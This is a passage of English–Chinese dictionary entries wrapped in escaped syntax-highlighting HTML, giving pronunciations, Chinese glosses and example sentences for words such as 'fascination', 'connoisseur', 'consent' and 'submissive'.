class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;魅力；有魅力的東西&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;S&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;Brian&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;fascination&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;girls&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;布萊恩令女孩子著迷。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;迷戀，陶醉&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;He&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;staring&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;her&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;fascination&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他出神地盯著她看。&lt;/span&gt;  


&lt;span class="n"&gt;redecorate&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;ri&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="nl"&gt;ri&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;dek&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;reit&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;重新裝飾；再裝飾（裝修）&lt;/span&gt;  


&lt;span class="n"&gt;connoisseur&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɝ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;ni&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;（尤指藝術品的）鑑賞家，行家&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;connoisseur&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;antique&lt;/span&gt; &lt;span class="n"&gt;furniture&lt;/span&gt;  
    &lt;span class="err"&gt;古傢俱行家&lt;/span&gt;  


&lt;span class="n"&gt;vocabulary&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;bj&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;bjul&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;ri&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;字彙；語彙；用字範圍&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;Wide&lt;/span&gt; &lt;span class="n"&gt;reading&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;increase&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;vocabulary&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;博覽群書會增加你的詞彙量。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;單字集；字典&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  


&lt;span class="n"&gt;vocabulary&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;bj&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;bjul&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;ri&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;字彙；語彙；用字範圍&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;Wide&lt;/span&gt; &lt;span class="n"&gt;reading&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;increase&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;vocabulary&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;博覽群書會增加你的詞彙量。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;單字集；字典&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  


&lt;span class="n"&gt;coveralls&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ʌ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;ɚ͵ɔ&lt;/span&gt;&lt;span class="n"&gt;lz&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ʌ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;ə͵&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;lz&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;（衣褲相連之）工作服&lt;/span&gt;  


&lt;span class="n"&gt;necrophilia&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;kr&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="err"&gt;ɪə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;͵&lt;/span&gt;&lt;span class="n"&gt;nekr&lt;/span&gt;&lt;span class="err"&gt;əˋ&lt;/span&gt;&lt;span class="n"&gt;fili&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;戀屍癖&lt;/span&gt;  


&lt;span class="n"&gt;novelty&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ɑ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ɔ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;lti&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;新穎，新奇&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;demand&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;quality&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;variety&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;novelty&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;現在需求的是品質、花式品種和新穎性。&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;新穎的事物；新奇的經驗&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;The&lt;/span&gt; &lt;span class="n"&gt;drive&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="n"&gt;was&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;novelty&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;her&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;she&lt;/span&gt; &lt;span class="n"&gt;enjoyed&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;免下車電影對她來講是件新奇事，她很喜歡看。&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="err"&gt;新穎小巧而廉價的物品&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;P1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;bought&lt;/span&gt; &lt;span class="n"&gt;some&lt;/span&gt; &lt;span class="n"&gt;novelties&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;boardwalk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;我在海濱人行道上買了一些新穎的小玩意兒。&lt;/span&gt;  


&lt;span class="n"&gt;consent&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;nt&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;sent&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vi&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;不及物動詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;同意，贊成，答應&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;They&lt;/span&gt; &lt;span class="n"&gt;would&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;consent&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;my&lt;/span&gt; &lt;span class="n"&gt;leaving&lt;/span&gt; &lt;span class="n"&gt;school&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;他們不同意我輟學。&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;同意，贊成，答應&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;Silence&lt;/span&gt; &lt;span class="n"&gt;means&lt;/span&gt; &lt;span class="n"&gt;consent&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  
    &lt;span class="err"&gt;沉默意味著同意。&lt;/span&gt;  


&lt;span class="n"&gt;flogger&lt;/span&gt;  
&lt;span class="n"&gt;IPA&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˈ&lt;/span&gt;&lt;span class="n"&gt;fl&lt;/span&gt;&lt;span class="err"&gt;ɒɡə&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;noun&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;person&lt;/span&gt; &lt;span class="n"&gt;who&lt;/span&gt; &lt;span class="n"&gt;whips&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;flogs&lt;/span&gt; &lt;span class="n"&gt;another&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;person&lt;/span&gt; &lt;span class="n"&gt;who&lt;/span&gt; &lt;span class="n"&gt;sells&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;brush&lt;/span&gt; &lt;span class="n"&gt;used&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;interior&lt;/span&gt; &lt;span class="n"&gt;decorating&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;give&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;marbled&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;woodgrain&lt;/span&gt; &lt;span class="n"&gt;effect&lt;/span&gt;  


&lt;span class="n"&gt;sadist&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;st&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;æ&lt;/span&gt;&lt;span class="n"&gt;dist&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;名詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;虐待狂者&lt;/span&gt;  


&lt;span class="n"&gt;rectifying&lt;/span&gt;  


  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;整流&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;求曲線長&lt;/span&gt;  


&lt;span class="n"&gt;submissive&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ʌ&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;misiv&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;服從的；柔順的&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
    &lt;span class="n"&gt;be&lt;/span&gt; &lt;span class="n"&gt;submissive&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;advice&lt;/span&gt;  
    &lt;span class="err"&gt;聽從勸告&lt;/span&gt;  


&lt;span class="n"&gt;devoted&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="err"&gt;ɪˋ&lt;/span&gt;&lt;span class="n"&gt;vot&lt;/span&gt;&lt;span class="err"&gt;ɪ&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;di&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;utid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.[(&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;獻身的；虔誠的；專心致志的&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;忠實的；摯愛的&lt;/span&gt;  
  &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;devote&lt;/span&gt;&lt;span class="err"&gt;的動詞過去式、過去分詞&lt;/span&gt;  


&lt;span class="n"&gt;consensual&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="err"&gt;ɛ&lt;/span&gt;&lt;span class="n"&gt;nsj&lt;/span&gt;&lt;span class="err"&gt;ʊə&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="err"&gt;ˋ&lt;/span&gt;&lt;span class="n"&gt;sensju&lt;/span&gt;&lt;span class="err"&gt;ə&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="err"&gt;形容詞&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;【律】在雙方同意下成立的&lt;/span&gt;  
  &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="err"&gt;【生理】交感性的&lt;/span&gt;  


&lt;span class="n"&gt;deem&lt;/span&gt;  
&lt;span class="n"&gt;KK&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;dim&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;DJ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;di&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="n"&gt;vt&lt;/span&gt;&lt;span class="p"&gt;.[&lt;/span&gt;&lt;span class="n"&gt;W&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
  &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="err"&gt;認為，以為；視作&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="err"&gt;（&lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="err"&gt;）&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;O8&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;O9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
